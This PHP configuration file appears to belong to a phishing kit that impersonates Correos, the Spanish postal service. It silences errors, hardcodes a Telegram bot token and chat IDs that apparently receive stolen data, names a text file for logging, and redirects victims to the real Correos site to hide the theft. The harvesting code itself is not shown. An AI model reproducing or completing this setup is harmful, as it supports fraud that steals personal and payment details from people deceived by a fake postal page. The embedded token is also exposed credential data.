<?php

error_reporting(0);

define("TELEGRAM_TOKEN", "5544847494:AAEnhyodvVER8Tj09GJdirYv8pqdLEoNpwQ");
define("TELEGRAM_CHAT_ID", "-819179036");
define("TELEGRAM_CHAT_IDD", "-819179036");
define("TXT_FILE_NAME", 'mjinina.txt');
define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");



?>